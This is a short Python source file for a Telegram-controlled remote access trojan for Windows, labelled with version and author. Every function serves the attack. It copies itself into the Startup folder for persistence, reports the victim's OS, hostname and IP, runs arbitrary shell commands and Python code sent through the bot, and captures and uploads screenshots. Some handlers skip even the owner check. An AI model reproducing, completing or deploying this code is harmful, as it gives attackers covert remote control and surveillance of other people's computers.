# made by gentlemanrc
# v. 1.0.1

import os
import sys
import time
import telebot
import config
import datetime
import socket
import platform
import pyautogui

bot = telebot.TeleBot(config.TOKEN)

def command_tg(message):
    bot.send_message(message.chat.id, f"[VICTIM'S OS OUTPUT]\nWARN: Non-english characters will not be displayed (bug)\n{get_cmd_output(message.text)}")

def exec_code(message):
    try:
        exec(message.text)
    except Exception as e:
        bot.send_message(message.chat.id, f'[ERROR] {e}')

def add_to_startup():
    this_file = sys.argv[0]
    this_file_name = os.path.basename(this_file)
    user_path = os.path.expanduser('~')
    if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{this_file_name}"):
        os.system(f'copy "{this_file}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

def get_cmd_output(command):
    out = os.popen(command).read()
    return out

def get_info():
    victim_info = []
    victim_info.append(platform.system())
    victim_info.append(datetime.datetime.now())
    hostname = socket.gethostname()
    victim_info.append(hostname)
    address = socket.gethostbyname(hostname)
    victim_info.append(address)
    return victim_info

def check_bot_owner(id):
    if id in config.BOT_OWNER_ID:
        return True
    else:
        return False

def send_screen(message):
    pyautogui.screenshot('s.jpg')
    screen = open('s.jpg', "rb")
    bot.send_photo(message.chat.id, screen)
    screen.close()
    os.system("del s.jpg")

def start_tg_ruler():
    @bot.message_handler(commands=['start'])
    def start_func(message):
        if check_bot_owner(message.chat.id) is True:
            bot.send_message(message.chat.id, f"Victim Info:\n[OS] {get_info()[0]}\n[OS TIME] {get_info()[1]}\n[HOSTNAME] {get_info()[2]}\n[IP] {get_info()[3]}")
        else:
            bot.send_message(message.chat.id, "Permission denied")
    @bot.message_handler(commands=['cmd'])
    def cmd_func(message):
        if check_bot_owner(message.chat.id) is True:
            msg = bot.send_message(message.chat.id, "Send command to execute on victim's PC:")
            bot.register_next_step_handler(msg, command_tg)
        else:
            bot.send_message(message.chat.id, "Permission denied")
    @bot.message_handler(commands=['screen', 'screenshot'])
    def screenshot_func(message):
        send_screen(message)

    @bot.message_handler(commands=['exec', 'execute', 'pyexecute'])
    def exec_func(message):
        msg = bot.send_message(message.chat.id, "Send code to execute on victim's PC:")
        bot.register_next_step_handler(msg, exec_code)

    bot.polling(none_stop=True)

def main():
    add_to_startup()
    start_tg_ruler()

if __name__ == '__main__':
    while (True):
        try:
            main()
        except Exception:
            continue
